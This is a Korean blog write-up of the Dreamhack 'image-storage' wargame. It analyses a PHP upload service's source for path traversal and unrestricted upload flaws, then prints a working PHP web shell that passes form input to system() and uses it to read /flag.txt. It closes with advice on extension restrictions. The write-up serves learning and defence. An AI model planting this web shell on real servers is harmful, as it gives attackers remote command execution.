---
title: '[Dreamhack] image-storage'
description: Dreamhack [Wargame] - image-storage
author: juhyeongkim
date: 2024-10-31 00:00:00 +0900
categories: [Dreamhack, Wargame]
tags: [Dreamhack, Wargame, Web]
# toc: false
# comments: false
# math: true
# mermaid: true
# image:
# path: 
    # lqip: 
    # alt: 
---

[문제 링크](https://dreamhack.io/wargame/challenges/38)

{% raw %}

## 서론

`image-storage` 문제의 목표는 **파일 업로드 취약점**을 통해 플래그를 획득하는 것이다.

문제의 설명은 아래와 같다.

---

php로 작성된 파일 저장 서비스입니다.

파일 업로드 취약점을 이용해 플래그를 획득하세요. 플래그는 `/flag.txt`에 있습니다.

---

<br>

## 웹 서비스 분석

### **index.php**

```php
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
<title>Image Storage</title>
</head>
<body>
    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Image Storage</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="/list.php">List</a></li>
            <li><a href="/upload.php">Upload</a></li>
          </ul>

        </div><!--/.nav-collapse -->
      </div>
    </nav><br/><br/>
    <div class="container">
    	<h2>Upload and Share Image !</h2>
    </div> 
</body>
</html>
```

인덱스 페이지는 위 코드를 통해 구현되어 있고, "Upload and Share Image!"를 출력한다.

고정되는 네비게이션 바에서는 `List`, `Upload` 버튼을 통해 각각 `/list.php`와 `/upload.php` 로 이동하는 메뉴를 출력한다.

<br>

### **upload.php**

```php
<?php
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES)) {
      $directory = './uploads/';
      $file = $_FILES["file"];
      $error = $file["error"];
      $name = $file["name"];
      $tmp_name = $file["tmp_name"];
     
      if ( $error > 0 ) {
        echo "Error: " . $error . "<br>";
      }else {
        if (file_exists($directory . $name)) {
          echo $name . " already exists. ";
        }else {
          if(move_uploaded_file($tmp_name, $directory . $name)){
            echo "Stored in: " . $directory . $name;
          }
        }
      }
    }else {
        echo "Error !";
    }
    die();
  }
?>
```

`upload.php` 파일에서 위의 `index.php` 파일에서도 존재하는 공통 네비게이션 바를 제외한 코드이다.

먼저 `POST` 요청이 들어오면, `$_FILES` 글로벌 배열에 `isset`으로 파일이 존재하는지 확인한다.

파일이 존재한다면, `$_FILES`에서 각 `key` 값을 가져와 변수에 저장한다.

`$error` 값이 존재한다면, 에러를 출력해주고, `file_exists()` 함수와 `.` 연산자를 통해 `$directory . $name`이라는 파일이 이미 존재한다면, 파일을 따로 업로드해주지 않고 이미 파일이 존재한다는 출력을 해준다.

만약 위 두 경우가 아니라면, `move_uploaded_file($tmp_name, $directory . $name)`를 통해 임시 파일 위치에서 `$directory . $name`으로 파일을 이동시켜 저장해준다.

여기서 **이용자가 입력한 파일의 이름이 그대로 저장되기 때문에, Path Traversal 취약점이 존재**하는 것을 확인할 수 있다.

그리고, **업로드할 파일에 대해 어떠한 검사도 진행하지 않기 때문에 웹 셸 업로드 공격에 취약하다는 것도 알 수 있다.**

<br>

### **list.php**

```php
<?php
        $directory = './uploads/';
        $scanned_directory = array_diff(scandir($directory), array('..', '.', 'index.html'));
        foreach ($scanned_directory as $key => $value) {
            echo "<li><a href='{$directory}{$value}'>".$value."</a></li><br/>";
        }
    ?>
```

역시 공통 네비게이션바 부분을 제외한 코드이며, `$scanned_directory = array_diff(scandir($directory), array('..', '.', 'index.html'));` 부분을 먼저 살펴보자.

`scandir()` 함수는 인자로 전달 받은 디렉토리에 존재하는 파일과 디렉토리 목록을 배열로 만들어서 리턴하는 함수이다.

여기서 `array_diff()`는 두 번째 인자에 전달된 값을 제외하기 때문에, `$scaned_directory` 변수에는 `..`, `.`, `index.html`을 제외한 `$directory` 내의 파일과 디렉토리 목록이 배열로 저장될 것이다.

그리고 바로 아래에서 반복문을 통해, 해당 배열에 접근하면서 HTML 태그를 활용하여 배열에 저장된 파일 이름과 해당 파일에 접근하는 하이퍼링크를 생성한다.

예를 들어, `$scanned_directory`에 아래와 같이 저장되어 있었다면, 세 개의 태그가 `<li>` 태그가 생성되어 각 파일에 접근할 수 있을 것이다.

```php
$scanned_directory = array(
    0 => 'file1.txt',
    1 => 'file2.png',
    2 => 'file3.html',
);
```

실행 결과는 아래와 같다.

```php
echo "<li><a href='./uploads/file1.txt'>file1.txt</a></li><br/>";
echo "<li><a href='./uploads/file2.png'>file2.png</a></li><br/>";
echo "<li><a href='./uploads/file3.html'>file3.html</a></li><br/>";
```

<br>

## Exploit

해당 문제에서는 **Path Traversal** 취약점과 **웹 셸 업로드** 취약점이 존재한다.

Path Traversal 취약점을 통해서 원하는 위치에 임의 파일을 업로드할 수 있긴 하지만, 서버에서 실행되는 파일의 이름을 찾아서 덮어써야 하고, 해당 파일이 어디에 위치하는지와, 업로드할 파일의 이름에 `../`과 같은 특수 문자를 넣는 방법이 쉽지 않다.

따라서, 간단히 **php 웹 셸**을 업로드하여, 해당 파일을 조회했을 때 서버의 셸을 획득할 수 있도록 익스플로잇 해볼 수 있다.

```php
// https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985
<html><body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form><pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?></pre></body></html>
```

위는 `HTML` 태그를 통해 `form`을 생성하여 폼의 입력을 `cmd`에 저장하고, `system` 함수의 인자로 전달하는 웹 셸이다.

해당 파일을 `.php` 확장자로 전달하면 `CGI`를 통해 해당 파일이 `list.php`에서 조회될 때 실행되어 셸을 획득하고, `form`을 통해 명령어를 전달할 수 있을 것이다.

<img width="365" alt="image" src="https://github.com/user-attachments/assets/e5ce784a-59c4-4d2c-9a76-e83be86c0bc8">

<img width="216" alt="image" src="https://github.com/user-attachments/assets/fa8aad67-342c-4a6f-9cd4-a9b5947305a7">

<img width="411" alt="image" src="https://github.com/user-attachments/assets/bf8ffd8f-7e62-434a-b1c2-71389406634e">

이렇게 `ex.php` 파일이 업로드된 것을 확인할 수 있고, `<a>` 태그를 통해 하이퍼링크를 클릭하여 `http://host3.dreamhack.games:16029/uploads/ex.php`에 방문하면 아래와 같이 웹 셸이 실행된다.

<img width="662" alt="image" src="https://github.com/user-attachments/assets/f0888692-73dd-4e61-b09b-0cf970b7e5ea">

그럼 이제, `cat /flag.txt`를 입력하면 아래와 같이 플래그를 획득할 수 있다.

<img width="659" alt="image" src="https://github.com/user-attachments/assets/819896d2-6887-4b76-9201-2351492fc1fa">

이번 문제에서는 `flag.txt`의 경로가 미리 주어져있어서 한번에 찾을 수 있지만, 아닌 경우에는 `ls [경로]` 또는 `ls [옵션]`을 통해 `flag.txt`의 위치를 먼저 찾아야 할 것이다.

실제로 찾아보면, 이번 문제 환경에서는 `ls ../../../../` 를 입력해줬을 때, 아래와 같이 `flag.txt`가 존재하는 것을 확인할 수 있었다.

<img width="674" alt="image" src="https://github.com/user-attachments/assets/bfdab24b-3a37-4e6c-9d1b-22deaca7dee7">

참고로, 파일 이름을 `ex.php`와 같이 `.php` 확장자가 아닌 `.html` 확장자로 쓰면, HTML 스크립트로 해석되어 `form`은 나타나지만, `php` 코드는 해석되지 않아서 셸이 실행되지 않는다.

그리고 만약 `ex`와 같이 파일 이름에 아무 확장자도 쓰지 않는다면, HTML 스크립트로도 해석되지 않고 아래와 같이 텍스트로 파일 내용만 출력된다.

<img width=600 alt="image" src="https://github.com/user-attachments/assets/378aa159-0934-4f62-a41e-54b8d7a8d0e5">

<br>

## 마치며

이번 문제에서는 **웹 셸 업로드** 취약점을 통해 웹 서버의 셸을 획득할 수 있었다.

해당 취약점을 막기 위한 대표적인 방법 중 하나가 **파일의 확장자를 제한**하는 것이다.

위에서도 확인할 수 있었듯이, 파일의 확장자를 쓰지 않거나 `.html`로 쓰면 **php 웹 셸** 자체가 실행되지 않아서 셸 코드 실행을 할 수가 없었다.

웹 리소스는 크게 **정적 리소스(Static Resource)** 와 **동적 리소스(Dynamic Resource)** 로 분류되는데,

정적 리소스는 이미지(`.png`, `.jpg`, `.gif`)나 비디오(`.mp4`, `.mov`) 등과 같이 서버에서 실행되지 않는 리소스를 말하고,

동적 리소스는 `.php`, `.jsp` 처럼 서버에서 실행되는 것들을 가리킨다.

따라서 동적 리소스의 확장자를 제한하면, 파일 업로드 취약점을 통한 **RCE(Remote Code Execution)** 공격으로부터 서버를 보호할 수 있을 것이다.

또 다른 방법으로는 서버의 파일 시스템 대신 `AWS`, `Azure`, `GCP`와 같은 정적 스토리지를 이용하여 웹 서버의 공격을 예방하는 것이다.

{% endraw %}